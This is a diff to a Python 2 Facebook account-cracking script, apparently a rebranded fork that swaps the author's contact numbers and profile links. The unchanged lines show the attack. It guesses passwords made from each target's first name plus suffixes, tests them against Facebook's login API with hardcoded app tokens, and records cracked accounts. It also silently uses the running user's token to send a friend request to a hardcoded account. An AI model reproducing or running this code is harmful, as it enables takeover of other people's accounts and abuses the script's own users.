@@ -64,8 +64,8 @@ logo = """ ▄︻┻═┳一 ЩєLc๏Mє ┼๏ ┼ђє Fąş┼єş┼ єVєr
            ╰━━╮┣╯╰┻━┻╯╰┻╯╰┻━━┻╯╰┻╯
            ╱╱╱╰╯
                                                  
-               WhatsApp: 0093711786523
-                       RAEES QALANDAR
+               WhatsApp: 0707035859
+                    RAEES QALANDAR
                      ▇◤▔▔▔▔▔▔▔◥▇
                      ▇▏◥▇◣┊◢▇◤▕▇
                      ▇▏▃▆▅▎▅▆▃▕▇
@@ -121,7 +121,7 @@ print  """\033[1;91m
                      ▇▇◣◥▅▅▅◤◢▇▇
                      ▇▇▇◣╲▇╱◢▇▇▇
                      ▇▇▇▇◣▇◢▇▇▇▇
-                   WhatsApp : 0711786523
+                   WhatsApp : 0707035859
 \033[1;96mAuthor  \033[1;93m: \033[1;92m Qalamdar Baba
 \033[1;96mInstagram \033[1;93m: \033[1;92m Qalandar.alami
 \033[1;96mFacebook  \033[1;93m: \033[1;92m Qalandar.alami
@@ -142,10 +142,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open http://www.facebook.com/QALANDAR.BABA786')
+            os.system('xdg-open http://www.facebook.com/RAEES.QALANDAR007')
     else:
         print "Wrong Username"
-        os.system('xdg-open  https://www.facebook.com/QALANDAR.BABA786 ')
+        os.system('xdg-open  https://www.facebook.com/RAEES.QALANDAR007 ')
 
 def login():
 	os.system('clear')
@@ -186,7 +186,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.Facebook.com/komail.khan.3781')
+				os.system('xdg-open https://www.Facebook.com/RAEES.QALANDAR007')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -400,7 +400,7 @@ def pilih_super():
 											cek.close()
 											cekpoint.append(user+pass4)
 										else:
-											pass5 = b['first_name'] + '12'
+											pass5 = b['first_name'] + '@@@'
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -414,7 +414,7 @@ def pilih_super():
 													cek.close()
 													cekpoint.append(user+pass5)
 												else:
-													pass6 = b['first_name'] + '1234'
+													pass6 = b['first_name'] + '@123'
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -430,7 +430,7 @@ def pilih_super():
 														else:
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = b['first_name'] + '1122'
+															pass7 = b['first_name'] + '...'
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
